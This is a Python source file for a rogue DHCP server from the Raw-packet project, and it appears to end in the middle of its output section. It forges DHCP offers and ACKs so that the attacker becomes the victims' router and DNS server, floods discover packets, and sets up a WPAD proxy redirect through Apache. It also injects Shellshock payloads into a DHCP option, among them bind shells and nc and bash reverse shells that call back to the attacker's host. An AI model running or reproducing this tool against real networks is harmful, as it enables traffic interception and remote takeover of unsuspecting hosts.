#!/usr/bin/env python
# -*- coding: utf-8 -*-

# region Description
"""
dhcp_rogue_server.py: Rogue DHCP server
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from sys import path
from os.path import dirname, abspath
from sys import exit
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW, htons
from os import makedirs
from shutil import copyfile
from base64 import b64encode
from netaddr import IPAddress
from time import sleep
from random import randint
from typing import Union, List, Dict
import subprocess as sub
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion


# region Get free IP addresses in local network
def get_free_ip_addresses() -> None:
    # Get all IP addresses in range from first to last offer IP address
    current_ip_address = first_offer_ip_address
    while base.ip_address_compare(current_ip_address, last_offer_ip_address, 'le'):
        free_ip_addresses.append(current_ip_address)
        current_ip_address = base.ip_address_increment(current_ip_address)

    base.print_info('ARP scan on interface: ', current_network_interface, ' is running ...')
    alive_hosts = scanner.find_ip_in_local_network(current_network_interface)

    for ip_address in alive_hosts:
        try:
            free_ip_addresses.remove(ip_address)
        except ValueError:
            pass
# endregion


# region Add client info in clients dictionary
def add_client_info_in_dictionary(client_mac_address: str,
                                  client_info: Union[bool, str, Dict[str, Union[bool, str]]],
                                  this_client_already_in_dictionary: bool = False) -> None:
    if this_client_already_in_dictionary:
        clients[client_mac_address].update(client_info)
    else:
        clients[client_mac_address] = client_info
# endregion


# region Make DHCP offer packet
def make_dhcp_offer_packet(transaction_id: int, offer_ip: str, client_mac: str,
                           destination_mac: Union[None, str] = None,
                           destination_ip: Union[None, str] = None) -> Union[None, bytes]:
    if destination_mac is None:
        destination_mac = 'ff:ff:ff:ff:ff:ff'
    if destination_ip is None:
        destination_ip = '255.255.255.255'
    return dhcp.make_response_packet(ethernet_src_mac=dhcp_server_mac_address,
                                     ethernet_dst_mac=destination_mac,
                                     ip_src=dhcp_server_ip_address,
                                     ip_dst=destination_ip,
                                     transaction_id=transaction_id,
                                     dhcp_message_type=2,
                                     your_client_ip=offer_ip,
                                     client_mac=client_mac,
                                     dhcp_server_id=dhcp_server_ip_address,
                                     lease_time=args.lease_time,
                                     netmask=network_mask,
                                     router=router_ip_address,
                                     dns=dns_server_ip_address,
                                     payload=None)
# endregion


# region Make DHCP ack packet
def make_dhcp_ack_packet(transaction_id: int, target_mac: str, target_ip: str,
                         destination_mac: Union[None, str] = None,
                         destination_ip: Union[None, str] = None,
                         shellshock_payload: Union[None, str] = None) -> Union[None, bytes]:
    if destination_mac is None:
        destination_mac: str = 'ff:ff:ff:ff:ff:ff'
    if destination_ip is None:
        destination_ip: str = '255.255.255.255'

    if wpad_url is not None:
        wpad_url_bytes = wpad_url.encode('utf-8')
    else:
        wpad_url_bytes = None

    return dhcp.make_response_packet(ethernet_src_mac=dhcp_server_mac_address,
                                     ethernet_dst_mac=destination_mac,
                                     ip_src=dhcp_server_ip_address,
                                     ip_dst=destination_ip,
                                     transaction_id=transaction_id,
                                     dhcp_message_type=5,
                                     your_client_ip=target_ip,
                                     client_mac=target_mac,
                                     dhcp_server_id=dhcp_server_ip_address,
                                     lease_time=args.lease_time,
                                     netmask=network_mask,
                                     router=router_ip_address,
                                     dns=dns_server_ip_address,
                                     payload=shellshock_payload,
                                     payload_option_code=args.shellshock_option_code,
                                     proxy=wpad_url_bytes,
                                     domain=domain,
                                     tftp=tftp_server_ip_address,
                                     wins=wins_server_ip_address)
# endregion


# region Make DHCP nak packet
def make_dhcp_nak_packet(transaction_id: int, target_mac: str,
                         target_ip: str, requested_ip: str) -> Union[None, bytes]:
    return dhcp.make_nak_packet(ethernet_src_mac=dhcp_server_mac_address,
                                ethernet_dst_mac=target_mac,
                                ip_src=dhcp_server_ip_address,
                                ip_dst=requested_ip,
                                transaction_id=transaction_id,
                                your_client_ip=target_ip,
                                client_mac=target_mac,
                                dhcp_server_id=dhcp_server_ip_address)

    # return dhcp.make_nak_packet(source_mac=dhcp_server_mac_address,
    #                             destination_mac=target_mac,
    #                             source_ip=dhcp_server_ip_address,
    #                             destination_ip=requested_ip,
    #                             transaction_id=transaction_id,
    #                             your_ip=target_ip,
    #                             client_mac=target_mac,
    #                             dhcp_server_id=dhcp_server_ip_address)
# endregion


# region Send DHCP discover packets
def discover_sender(number_of_packets=999999) -> None:
    packet_index = 0
    discover_socket = socket(AF_PACKET, SOCK_RAW)
    discover_socket.bind((current_network_interface, 0))

    if dhcp_discover_packets_source_mac != your_mac_address:
        relay_agent_ip_address = base.get_random_ip_on_interface(current_network_interface)
    else:
        relay_agent_ip_address = your_ip_address

    while packet_index < number_of_packets:
        try:
            discover_socket.send(dhcp.make_discover_packet(ethernet_src_mac=dhcp_discover_packets_source_mac,
                                                           client_mac=eth.make_random_mac(),
                                                           host_name=base.make_random_string(),
                                                           relay_agent_ip=relay_agent_ip_address))
            sleep(args.discover_delay)
        except TypeError:
            base.print_error('Something went wrong when sending DHCP discover packets!')
            break
        packet_index += 1

    discover_socket.close()
# endregion


# region Reply to DHCP and ARP requests
def reply(request):

    # region Define global variables
    # global raw_socket
    # global clients
    # global target_ip_address
    # global router_ip_address
    # global payload
    # global shellshock_payload
    # global args
    # global discover_sender_is_work
    # endregion

    # region DHCP
    if 'DHCPv4' in request.keys():

        # region Get transaction id and client MAC address
        transaction_id = request['BOOTP']['transaction-id']
        client_mac_address = request['BOOTP']['client-mac-address']
        # endregion

        # region Check this client already in dict
        client_already_in_dictionary = False
        if client_mac_address in clients.keys():
            client_already_in_dictionary = True
        # endregion

        # region DHCP DISCOVER
        if request['DHCPv4'][53] == 1:

            # region Print INFO message
            base.print_info('DHCP DISCOVER from: ', client_mac_address, ' transaction id: ', hex(transaction_id))
            # endregion

            # If parameter 'Do not send DHCP OFFER packets' is not set
            if not args.dnsop:

                # region Start DHCP discover sender
                if args.send_discover:
                    if not discover_sender_is_work:
                        discover_sender(100)
                # endregion

                # If target IP address is set - offer IP = target IP
                if target_ip_address is not None:
                    offer_ip_address = target_ip_address

                # If target IP address is not set - offer IP = random IP from free IP addresses list
                else:
                    random_index = randint(0, len(free_ip_addresses))
                    offer_ip_address = free_ip_addresses[random_index]

                    # Delete offer IP from free IP addresses list
                    del free_ip_addresses[random_index]

                if args.broadcast_response:
                    offer_packet = make_dhcp_offer_packet(transaction_id, offer_ip_address, client_mac_address)
                else:
                    offer_packet = make_dhcp_offer_packet(transaction_id, offer_ip_address, client_mac_address,
                                                          client_mac_address, offer_ip_address)

                raw_socket.send(offer_packet)

                # Add client info in global clients dictionary
                add_client_info_in_dictionary(client_mac_address,
                                              {'transaction': transaction_id, 'discover': True,
                                               'offer_ip': offer_ip_address},
                                              client_already_in_dictionary)

                # Print INFO message
                base.print_info('DHCP OFFER to: ', client_mac_address, ' offer IP: ', offer_ip_address)
        # endregion

        # region DHCP RELEASE
        if request['DHCPv4'][53] == 7:
            if request['BOOTP']['client-ip-address'] is not None:
                client_ip = request['BOOTP']['client-ip-address']
                base.print_info('DHCP RELEASE from: ', client_ip + ' (' + client_mac_address + ')',
                                ' transaction id: ', hex(transaction_id))

                # Add client info in global clients dictionary
                add_client_info_in_dictionary(client_mac_address,
                                              {'client_ip': client_ip},
                                              client_already_in_dictionary)
                # print clients

                # Add release client IP in free IP addresses list
                if client_ip not in free_ip_addresses:
                    free_ip_addresses.append(client_ip)
            else:
                base.print_info('DHCP RELEASE from: ', client_mac_address, ' transaction id: ', hex(transaction_id))

            # Add client info in global clients dictionary
            add_client_info_in_dictionary(client_mac_address,
                                          {'release': True},
                                          client_already_in_dictionary)
            # print clients
        # endregion

        # region DHCP INFORM
        if request['DHCPv4'][53] == 8:
            if request['BOOTP']['client-ip-address'] is not None:
                client_ip = request['BOOTP']['client-ip-address']
                base.print_info('DHCP INFORM from: ', client_ip + ' (' + client_mac_address + ')',
                                ' transaction id: ', hex(transaction_id))

                # If client IP in free IP addresses list delete this
                if client_ip in free_ip_addresses:
                    free_ip_addresses.remove(client_ip)

                # Add client info in global clients dictionary
                add_client_info_in_dictionary(client_mac_address,
                                              {'client_ip': client_ip},
                                              client_already_in_dictionary)
                # print clients

            else:
                base.print_info('DHCP INFORM from: ', client_mac_address, ' transaction id: ', hex(transaction_id))

            # Add client info in global clients dictionary
            add_client_info_in_dictionary(client_mac_address,
                                          {'inform': True},
                                          client_already_in_dictionary)
            # print clients
        # endregion

        # region DHCP REQUEST
        if request['DHCPv4'][53] == 3:

            # region Set local variables
            requested_ip = '0.0.0.0'
            offer_ip = None
            # endregion

            # region Get requested IP
            if 50 in request['DHCPv4'].keys():
                requested_ip = str(request['DHCPv4'][50])
            # endregion

            # region Print info message
            base.print_info('DHCP REQUEST from: ', client_mac_address, ' transaction id: ', hex(transaction_id),
                            ' requested ip: ', requested_ip)
            # endregion

            # region Requested IP not in range from first offer IP to last offer IP
            if not base.ip_address_in_range(requested_ip, first_offer_ip_address, last_offer_ip_address):
                base.print_warning('Client: ', client_mac_address, ' requested IP: ', requested_ip,
                                   ' not in range: ', first_offer_ip_address + ' - ' + last_offer_ip_address)
            # endregion

            # region Requested IP in range from first offer IP to last offer IP
            else:
                # region Start DHCP discover sender
                if args.send_discover:
                    if not discover_sender_is_work:
                        discover_sender(100)
                # endregion

                # region Change client info in global clients dictionary

                # Add client info in global clients dictionary
                add_client_info_in_dictionary(client_mac_address,
                                              {'request': True, 'requested_ip': requested_ip,
                                               'transaction': transaction_id},
                                              client_already_in_dictionary)

                # Delete ARP mitm success keys in dictionary for this client
                clients[client_mac_address].pop('client request his ip', None)
                clients[client_mac_address].pop('client request router ip', None)
                clients[client_mac_address].pop('client request dns ip', None)

                # endregion

                # region Get offer IP address
                try:
                    offer_ip = clients[client_mac_address]['offer_ip']
                except KeyError:
                    pass
                # endregion

                # region This client already send DHCP DISCOVER and offer IP != requested IP
                if offer_ip is not None and offer_ip != requested_ip:
                    # Print error message
                    base.print_error('Client: ', client_mac_address, ' requested IP: ', requested_ip,
                                     ' not like offer IP: ', offer_ip)

                    # Create and send DHCP nak packet
                    nak_packet = make_dhcp_nak_packet(transaction_id, client_mac_address, offer_ip, requested_ip)
                    raw_socket.send(nak_packet)
                    base.print_info('DHCP NAK to: ', client_mac_address, ' requested ip: ', requested_ip)

                    # Add client info in global clients dictionary
                    add_client_info_in_dictionary(client_mac_address,
                                                  {'mitm': 'error: offer ip not like requested ip', 'offer_ip': None},
                                                  client_already_in_dictionary)
                    # print clients
                # endregion

                # region Offer IP == requested IP or this is a first request from this client
                else:

                    # region Target IP address is set and requested IP != target IP
                    if target_ip_address is not None and requested_ip != target_ip_address:

                        # Print error message
                        base.print_error('Client: ', client_mac_address, ' requested IP: ', requested_ip,
                                         ' not like target IP: ', target_ip_address)

                        # Create and send DHCP nak packet
                        nak_packet = make_dhcp_nak_packet(transaction_id, client_mac_address,
                                                          target_ip_address, requested_ip)
                        raw_socket.send(nak_packet)
                        base.print_info('DHCP NAK to: ', client_mac_address, ' requested ip: ', requested_ip)

                        # Add client info in global clients dictionary
                        add_client_info_in_dictionary(client_mac_address,
                                                      {'mitm': 'error: target ip not like requested ip',
                                                       'offer_ip': None, 'nak': True},
                                                      client_already_in_dictionary)

                    # endregion

                    # region Target IP address is set and requested IP == target IP or Target IP is not set
                    else:

                        # region Settings shellshock payload
                        payload: Union[None, str] = None
                        shellshock_payload: Union[None, str] = None

                        try:
                            assert args.shellshock_command is not None \
                                   or args.bind_shell \
                                   or args.nc_reverse_shell \
                                   or args.nce_reverse_shell \
                                   or args.bash_reverse_shell, 'ShellShock not used!'
                            # region Create payload

                            # Network settings command in target machine
                            net_settings = args.ip_path + 'ip addr add ' + requested_ip + '/' + \
                                           str(IPAddress(network_mask).netmask_bits()) + ' dev ' + args.iface_name + ';'

                            # Shellshock payload: <user bash command>
                            if args.shellshock_command is not None:
                                payload = args.shellshock_command

                            # Shellshock payload:
                            # awk 'BEGIN{s='/inet/tcp/<bind_port>/0/0';for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &
                            if args.bind_shell:
                                payload = 'awk \'BEGIN{s=\'/inet/tcp/' + str(args.bind_port) + \
                                          '/0/0\';for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}\' &'

                            # Shellshock payload:
                            # rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> <your_port> >/tmp/f &
                            if args.nc_reverse_shell:
                                payload = 'rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + \
                                          your_ip_address + ' ' + str(args.reverse_port) + ' >/tmp/f &'

                            # Shellshock payload:
                            # /bin/nc -e /bin/sh <your_ip> <your_port> 2>&1 &
                            if args.nce_reverse_shell:
                                payload = '/bin/nc -e /bin/sh ' + your_ip_address + ' ' + str(args.reverse_port) + ' 2>&1 &'

                            # Shellshock payload:
                            # /bin/bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1 &
                            if args.bash_reverse_shell:
                                payload = '/bin/bash -i >& /dev/tcp/' + your_ip_address + \
                                          '/' + str(args.reverse_port) + ' 0>&1 &'

                            if payload is not None:

                                # Do not add network settings command in payload
                                if not args.without_network:
                                    payload = net_settings + payload

                                # Send payload to target in clear text
                                if args.without_base64:
                                    shellshock_payload = '() { :; }; ' + payload

                                # Send base64 encoded payload to target in clear text
                                else:
                                    payload = b64encode(payload)
                                    shellshock_payload = '() { :; }; /bin/sh <(/usr/bin/base64 -d <<< ' + payload + ')'
                            # endregion

                            # region Check Shellshock payload length
                            if shellshock_payload is not None:
                                if len(shellshock_payload) > 255:
                                    base.print_error('Length of shellshock payload is very big! Current length: ',
                                                     str(len(shellshock_payload)), ' Maximum length: ', '254')
                                    shellshock_payload = None
                            # endregion

                        except AssertionError:
                            pass
                        # endregion

                        # region Send DHCP ack and print info message
                        if args.broadcast_response:
                            ack_packet = make_dhcp_ack_packet(transaction_id=transaction_id,
                                                              target_mac=client_mac_address,
                                                              target_ip=requested_ip,
                                                              shellshock_payload=shellshock_payload)
                        else:
                            ack_packet = make_dhcp_ack_packet(transaction_id=transaction_id,
                                                              target_mac=client_mac_address,
                                                              target_ip=requested_ip,
                                                              destination_mac=client_mac_address,
                                                              destination_ip=requested_ip,
                                                              shellshock_payload=shellshock_payload)

                        if args.apple:
                            base.print_info('DHCP ACK to: ', client_mac_address, ' requested ip: ', requested_ip)
                            for _ in range(3):
                                raw_socket.send(ack_packet)
                                sleep(0.2)
                        else:
                            raw_socket.send(ack_packet)
                            base.print_info('DHCP ACK to: ', client_mac_address, ' requested ip: ', requested_ip)
                        # endregion

                        # region Add client info in global clients dictionary
                        try:
                            clients[client_mac_address].update({'mitm': 'success'})
                        except KeyError:
                            clients[client_mac_address] = {'mitm': 'success'}
                        # endregion

                    # endregion

                # endregion

            # endregion

        # endregion

        # region DHCP DECLINE
        if request['DHCPv4'][53] == 4:
            # Get requested IP
            requested_ip = '0.0.0.0'
            if 50 in request['DHCPv4'].keys():
                requested_ip = str(request['DHCPv4'][50])

            # Print info message
            base.print_info('DHCP DECLINE from: ', requested_ip + ' (' + client_mac_address + ')',
                            ' transaction id: ', hex(transaction_id))

            # If client IP in free IP addresses list delete this
            if requested_ip in free_ip_addresses:
                free_ip_addresses.remove(requested_ip)

            # Add client info in global clients dictionary
            add_client_info_in_dictionary(client_mac_address,
                                          {'decline_ip': requested_ip, 'decline': True},
                                          client_already_in_dictionary)
            # print clients
        # endregion

    # endregion DHCP

    # region ARP
    if 'ARP' in request.keys():
        if request['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
                request['ARP']['target-mac'] == '00:00:00:00:00:00':

            # region Set local variables
            arp_sender_mac_address = request['ARP']['sender-mac']
            arp_sender_ip_address = request['ARP']['sender-ip']
            arp_target_ip_address = request['ARP']['target-ip']
            # endregion

            # region Print info message
            base.print_info('ARP request from: ', arp_sender_mac_address,
                            ' "Who has ', arp_target_ip_address, ' Tell ', arp_sender_ip_address, '"')
            # endregion

            # region Get client mitm status
            try:
                mitm_status = clients[arp_sender_mac_address]['mitm']
            except KeyError:
                mitm_status = ''
            # endregion

            # region Get client requested ip
            try:
                requested_ip = clients[arp_sender_mac_address]['requested_ip']
            except KeyError:
                requested_ip = ''
            # endregion

            # region Create IPv4 address conflict
            if mitm_status.startswith('error'):
                arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
                                              ethernet_dst_mac=arp_sender_mac_address,
                                              sender_mac=your_mac_address, sender_ip=arp_target_ip_address,
                                              target_mac=arp_sender_mac_address, target_ip=arp_sender_ip_address)
                raw_socket.send(arp_reply)
                base.print_info('ARP response to:  ', arp_sender_mac_address,
                                ' \'', arp_target_ip_address + ' is at ' + your_mac_address,
                                '\' (IPv4 address conflict)')
            # endregion

            # region MITM success
            if mitm_status.startswith('success'):

                if arp_target_ip_address == requested_ip:
                    clients[arp_sender_mac_address].update({'client request his ip': True})

                if arp_target_ip_address == router_ip_address:
                    clients[arp_sender_mac_address].update({'client request router ip': True})

                if arp_target_ip_address == dns_server_ip_address:
                    clients[arp_sender_mac_address].update({'client request dns ip': True})

                try:
                    test = clients[arp_sender_mac_address]['client request his ip']
                    test = clients[arp_sender_mac_address]['client request router ip']
                    test = clients[arp_sender_mac_address]['client request dns ip']

                    try:
                        test = clients[arp_sender_mac_address]['success message']
                    except KeyError:
                        if args.exit:
                            sleep(3)
                            base.print_success('MITM success: ', requested_ip + ' (' + arp_sender_mac_address + ')')
                            exit(0)
                        else:
                            base.print_success('MITM success: ', requested_ip + ' (' + arp_sender_mac_address + ')')
                            clients[arp_sender_mac_address].update({'success message': True})

                except KeyError:
                    pass

            # endregion

    # endregion

# endregion


# region Main function
if __name__ == '__main__':

    # region import Raw-packet classes
    path.append(dirname(dirname(dirname(abspath(__file__)))))
    utils_path = dirname(dirname(dirname(abspath(__file__)))) + '/raw_packet/Utils/'
    from raw_packet.Utils.base import Base
    from raw_packet.Utils.network import RawEthernet, RawARP, RawIPv4, RawUDP, RawDHCPv4
    from raw_packet.Utils.tm import ThreadManager
    from raw_packet.Scanners.scanner import Scanner
    # endregion

    # region Init Raw-packet classes
    base: Base = Base()
    scanner: Scanner = Scanner()
    eth: RawEthernet = RawEthernet()
    arp: RawARP = RawARP()
    ip: RawIPv4 = RawIPv4()
    udp: RawUDP = RawUDP()
    dhcp: RawDHCPv4 = RawDHCPv4()
    # endregion

    try:

        # region Check user, platform and create threads
        base.check_user()
        base.check_platform()
        tm = ThreadManager(3)
        # endregion

        # region Parse script arguments
        parser = ArgumentParser(description='Rogue DHCPv4 server')

        parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')

        parser.add_argument('-f', '--first_offer_ip', type=str, help='Set first client ip for offering', default=None)
        parser.add_argument('-l', '--last_offer_ip', type=str, help='Set last client ip for offering', default=None)
        parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
        parser.add_argument('-T', '--target_ip', type=str, help='Set client IP address with MAC in --target_mac',
                            default=None)
        parser.add_argument('-m', '--netmask', type=str, help='Set network mask', default=None)

        parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server MAC address, if not set use your MAC address',
                            default=None)
        parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your IP address',
                            default=None)

        parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address',
                            default=None)
        parser.add_argument('--dns', type=str, help='Set DNS server IP address, if not set use your ip address',
                            default=None)
        parser.add_argument('--tftp', type=str, help='Set TFTP server IP address', default=None)
        parser.add_argument('--wins', type=str, help='Set WINS server IP address', default=None)
        parser.add_argument('--proxy', type=str, help='Set Proxy URL, example: 192.168.0.1:8080', default=None)
        parser.add_argument('--domain', type=str, help='Set domain name for search, default=local', default='local')
        parser.add_argument('--lease_time', type=int, help='Set lease time, default=172800', default=172800)

        parser.add_argument('-s', '--send_discover', action='store_true',
                            help='Send DHCP discover packets in the background thread')
        parser.add_argument('-r', '--discover_rand_mac', action='store_true',
                            help='Use random MAC address for source MAC address in DHCP discover packets')
        parser.add_argument('-d', '--discover_delay', type=float,
                            help='Set delay between DHCP discover packets (default=0.5 sec.)', default=0.5)

        parser.add_argument('-O', '--shellshock_option_code', type=int,
                            help='Set dhcp option code for inject shellshock payload, default=114', default=114)
        parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
        parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
        parser.add_argument('-p', '--bind_port', type=int, help='Set port for listen bind shell (default=1234)',
                            default=1234)
        parser.add_argument('-N', '--nc_reverse_shell', action='store_true', 
                            help='Use nc reverse tcp shell in DHCP client')
        parser.add_argument('-E', '--nce_reverse_shell', action='store_true',
                            help='Use nc -e reverse tcp shell in DHCP client')
        parser.add_argument('-R', '--bash_reverse_shell', action='store_true',
                            help='Use bash reverse tcp shell in DHCP client')
        parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen bind shell (default=443)',
                            default=443)
        parser.add_argument('-n', '--without_network', action='store_true', help='Do not add network configure in payload')
        parser.add_argument('-B', '--without_base64', action='store_true', help='Do not use base64 encode in payload')
        parser.add_argument('--ip_path', type=str,
                            help='Set path to "ip" in shellshock payload, default = /bin/', default='/bin/')
        parser.add_argument('--iface_name', type=str,
                            help='Set iface name in shellshock payload, default = eth0', default='eth0')

        parser.add_argument('--broadcast_response', action='store_true', help='Send broadcast response')
        parser.add_argument('--dnsop', action='store_true', help='Do not send DHCP OFFER packets')
        parser.add_argument('--exit', action='store_true', help='Exit on success MiTM attack')
        parser.add_argument('--apple', action='store_true', help='Add delay before send DHCP ACK')
        parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')

        args = parser.parse_args()
        # endregion

        # region Print banner if argument quit is not set
        if not args.quiet:
            base.print_banner()
        # endregion

        # region Set variables
        target_mac_address: Union[None, str] = None
        target_ip_address: Union[None, str] = None

        first_offer_ip_address: Union[None, str] = None
        last_offer_ip_address: Union[None, str] = None

        dhcp_discover_packets_source_mac: Union[None, str] = None

        free_ip_addresses: List[str] = list()
        clients: Dict[str, Union[str, Dict[str, Union[bool, str]]]] = dict()

        discover_sender_is_work: bool = False

        wpad_url: Union[None, str] = None
        # endregion

        # region Get your network settings
        if args.interface is None:
            base.print_warning('Please set a network interface for sniffing ARP and DHCP requests ...')
        current_network_interface: str = base.network_interface_selection(args.interface)
        your_mac_address: str = base.get_interface_mac_address(current_network_interface)
        your_ip_address: str = base.get_interface_ip_address(current_network_interface)
        your_network_mask: str = base.get_interface_netmask(current_network_interface)

        if args.netmask is None:
            network_mask: str = your_network_mask
        else:
            network_mask: str = args.netmask
        # endregion

        # region Create raw socket
        raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
        raw_socket.bind((current_network_interface, 0))
        # endregion

        # region Get first and last IP address in your network
        first_ip_address: str = base.get_first_ip_on_interface(current_network_interface)
        last_ip_address: str = base.get_last_ip_on_interface(current_network_interface)
        first_offer_ip_address: str = base.get_second_ip_on_interface(current_network_interface)
        last_offer_ip_address: str = base.get_penultimate_ip_on_interface(current_network_interface)
        # endregion

        # region Set target MAC and IP address, if target IP is not set - get first and last offer IP
        if args.target_mac is not None:
            assert base.mac_address_validation(args.target_mac), \
                'Bad target MAC address `-t, --target_mac`: ' + base.error_text(args.target_mac) + \
                '; example MAC address: ' + base.info_text('12:34:56:78:90:ab')
            target_mac_address = str(args.target_mac).lower()

        # region Target IP is set
        if args.target_ip is not None:
            assert target_mac_address is not None, \
                'Please set target MAC address (example: --target_mac 00:AA:BB:CC:DD:FF)' + \
                ', for target IP address: ' + base.info_text(args.target_ip)
            assert base.ip_address_in_range(args.target_ip, first_ip_address, last_ip_address), \
                'Bad target IP address `-T, --target_ip`: ' + base.error_text(args.target_ip) +  \
                '; target IP address must be in range: ' + base.info_text(first_ip_address + ' - ' + last_ip_address)
            target_ip_address = args.target_ip

        # endregion

        # region Target IP is not set - get first and last offer IP
        else:
            # Check first offer IP address
            if args.first_offer_ip is not None:
                assert base.ip_address_in_range(args.first_offer_ip, first_ip_address, last_ip_address), \
                    'Bad value `-f, --first_offer_ip`: ' + base.error_text(args.first_offer_ip) + \
                    '; first IP address in your network: ' + base.info_text(first_ip_address)
                first_offer_ip_address = args.first_offer_ip

            # Check last offer IP address
            if args.last_offer_ip is not None:
                assert base.ip_address_in_range(args.last_offer_ip, first_ip_address, last_ip_address), \
                    'Bad value `-l, --last_offer_ip`: ' + base.error_text(args.last_offer_ip) + \
                    '; last IP address in your network: ' + base.info_text(last_ip_address)
                last_offer_ip_address = args.last_offer_ip
        # endregion

        # endregion

        # region Set DHCP sever MAC and IP address
        if args.dhcp_mac is None:
            dhcp_server_mac_address: str = your_mac_address
        else:
            assert base.mac_address_validation(args.dhcp_mac), \
                'Bad DHCP server MAC address `--dhcp_mac`: ' + base.error_text(args.dhcp_mac) + \
                '; example MAC address: ' + base.info_text('12:34:56:78:90:ab')
            dhcp_server_mac_address: str = args.dhcp_mac

        if args.dhcp_ip is None:
            dhcp_server_ip_address: str = your_ip_address
        else:
            assert base.ip_address_in_range(args.dhcp_ip, first_ip_address, last_ip_address), \
                'Bad DHCP server IP address `--dhcp_ip`: ' + base.error_text(args.dhcp_ip) + \
                '; DHCP server IP address must be in range: ' + \
                base.info_text(first_ip_address + ' - ' + last_ip_address)
            dhcp_server_ip_address: str = args.dhcp_ip
        # endregion

        # region Set router, dns, tftp, wins IP address

        # region Set router IP address
        if args.router is None:
            router_ip_address: str = your_ip_address
        else:
            assert base.ip_address_in_range(args.router, first_ip_address, last_ip_address), \
                'Bad Router IP address `--router`: ' + base.error_text(args.router) + \
                '; Router IP address must be in range: ' + base.info_text(first_ip_address + ' - ' + last_ip_address)
            router_ip_address: str = args.router
        # endregion

        # region Set DNS server IP address
        if args.dns is None:
            dns_server_ip_address: str = your_ip_address
        else:
            assert base.ip_address_validation(args.dns), \
                'Bad DNS server IP address in `--dns` parameter: ' + base.info_text(args.dns)
            dns_server_ip_address: str = args.dns
        # endregion

        # region Set TFTP server IP address
        if args.tftp is None:
            tftp_server_ip_address: str = your_ip_address
        else:
            assert base.ip_address_validation(args.tftp), \
                'Bad TFTP server IP address in `--tftp` parameter: ' + base.info_text(args.tftp)
            tftp_server_ip_address: str = args.tftp
        # endregion

        # region Set WINS server IP address
        if args.wins is None:
            wins_server_ip_address: str = your_ip_address
        else:
            assert base.ip_address_in_range(args.wins, first_ip_address, last_ip_address), \
                'Bad value `--wins`: ' + base.error_text(args.wins) + \
                '; WINS server IP address must be in range: ' + \
                base.info_text(first_ip_address + ' - ' + last_ip_address)
            wins_server_ip_address: str = args.wins
        # endregion

        # endregion

        # region Set proxy

        if args.proxy is not None:

            # Set variables
            wpad_url = 'http://' + your_ip_address + '/wpad.dat'
            apache2_sites_available_dir = '/etc/apache2/sites-available/'
            apache2_sites_path = '/var/www/html/'
            wpad_path = apache2_sites_path + 'wpad/'

            # Apache2 sites settings
            default_site_file_name = '000-default.conf'
            default_site_file = open(apache2_sites_available_dir + default_site_file_name, 'w')
            default_site_file.write('<VirtualHost *:80>\n' +
                                    '\tServerAdmin admin@wpad.com\n' +
                                    '\tDocumentRoot ' + wpad_path + '\n' +
                                    '\t<Directory ' + wpad_path + '>\n' +
                                    '\t\tOptions FollowSymLinks\n' +
                                    '\t\tAllowOverride None\n' +
                                    '\t\tOrder allow,deny\n' +
                                    '\t\tAllow from all\n' +
                                    '\t</Directory>\n' +
                                    '</VirtualHost>\n')
            default_site_file.close()

            # Create dir with wpad.dat script
            try:
                makedirs(wpad_path)
            except OSError:
                base.print_info('Path: ', wpad_path, ' already exist')

            # Copy wpad.dat script
            wpad_script_name = 'wpad.dat'
            wpad_script_src = utils_path + wpad_script_name
            wpad_script_dst = wpad_path + wpad_script_name
            copyfile(src=wpad_script_src, dst=wpad_script_dst)

            # Read redirect script
            with open(wpad_script_dst, 'r') as redirect_script:
                content = redirect_script.read()

            # Replace the Proxy URL
            content = content.replace('proxy_url', args.proxy)

            # Write redirect script
            with open(wpad_script_dst, 'w') as redirect_script:
                redirect_script.write(content)

            # Restart Apache2 server
            try:
                base.print_info('Restarting apache2 server ...')
                sub.Popen(['service apache2 restart  >/dev/null 2>&1'], shell=True)
            except OSError as e:
                base.print_error('Something went wrong while trying to run ', '`service apache2 restart`')
                exit(1)

            # Check apache2 is running
            sleep(2)
            apache2_pid = base.get_process_pid('apache2')
            if apache2_pid == -1:
                base.print_error('Apache2 server is not running!')
                exit(1)
            else:
                base.print_info('Apache2 server is running, PID: ', str(apache2_pid))

        # endregion

        # region Set Shellshock option code
        if 255 < args.shellshock_option_code < 0:
            base.print_error('Bad value: ', args.shellshock_option_code,
                             'in DHCP option code! This value should be in the range from 1 to 254')
            exit(1)
        # endregion

        # region Set search domain
        domain: bytes = args.domain.encode('utf-8')
        # endregion

        # region General output
        if not args.quiet:
            base.print_info('Network interface: ', current_network_interface)
            base.print_info('Your IP address: ', your_ip_address)
            base.print_info('Your MAC address: ', your_mac_address)

            if target_mac_address is not None:
                base.print_info('Target MAC: ', target_mac_address)

            # If target IP address is set print target IP, else print first and last offer IP
            if target_ip_address is not None:
                base.print_info('Target IP: ', target_ip_address)
            else:
                base.print_info('First offer IP: ', first_offer_ip_address)
                base.print_info('Last offer IP: ', last_offer_ip_address)

            base.print_info('DHCP server mac address: ', dhcp_server_mac_address)
            base.print_info('DHCP server ip address: ', dhcp_server_ip_address)
            base.print_info('Router IP address: ', router_ip_address)
